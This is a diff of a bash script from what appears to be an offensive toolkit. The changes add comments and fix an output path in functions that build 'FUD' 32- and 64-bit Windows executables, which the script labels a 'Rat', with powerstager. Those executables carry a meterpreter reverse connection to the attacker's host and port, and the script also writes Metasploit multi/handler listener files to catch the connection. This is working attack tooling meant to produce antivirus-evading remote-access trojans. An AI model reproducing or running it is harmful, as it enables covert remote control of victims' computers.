@@ -1297,8 +1297,11 @@ echo ""
 echo -e $green "Write the name for this config . (ex : pstager)"
 echo -ne "Filename : ";tput sgr0
 read fname
+#checking if user compiled a 32bit or 64bit ese in powerstager
 if [ $met == "32" ]
+#32bit exe created
 then
+#checking if user wrote any input for listener name
 if [ -z $fname ]
 then
 svf=$path/config/listeners/pstager32.rc
@@ -1325,8 +1328,10 @@ echo ""
 fi
 elif [ $met == "64" ]
 then
+#64bit exe created
 if [ -z $fname ] 
 then
+#user did not wrote any input for the listener , then write default name
 svf=$path/config/listeners/pstager64.rc
 rm -rf $svf >/dev/null 2>&1
 echo "use exploit/multi/handler" > $svf
@@ -1335,9 +1340,10 @@ echo "set LHOST $yourip" >> $svf
 echo "set LPORT $yourport" >> $svf
 echo "exploit -j" >> $svf
 echo -e $okegreen ""
-echo "Configuration file saved to $list/$pstager64.rc"
+echo "Configuration file saved to $list/pstager64.rc"
 echo ""
 else
+#user wrote a name for the listener
 svf=$path/config/listeners/$fname.rc
 rm -rf $svf >/dev/null 2>&1
 echo "use exploit/multi/handler" > $svf
@@ -1456,6 +1462,7 @@ case $fwin in
     echo -e $red "[*] Starting the creation of your FUD 32bit Exe"
     sleep 4
     python $pstager --target win32 --meterpreter --lhost $yourip --lport $yourport --fake-error --output $fira >> $logfud 2>&1
+    #Create a var with 32 = 32bit , so pstagef function know which listener configutation must be written (in case selected)
     met="32"
     pstagef
 
@@ -1471,6 +1478,7 @@ echo ""
     echo -e $yellow "  Rat Filename  :$okegreen $fira"
     fstager=$path/$fira
     python $pstager --target win64 --meterpreter --lhost $yourip --lport $yourport --fake-error --output $fira >> $logfud 2>&1
+    #Create a var with 64 = 64bit , so pstagef function know which listener configutation must be written (in case selected)
     met="64"
     pstagef
 
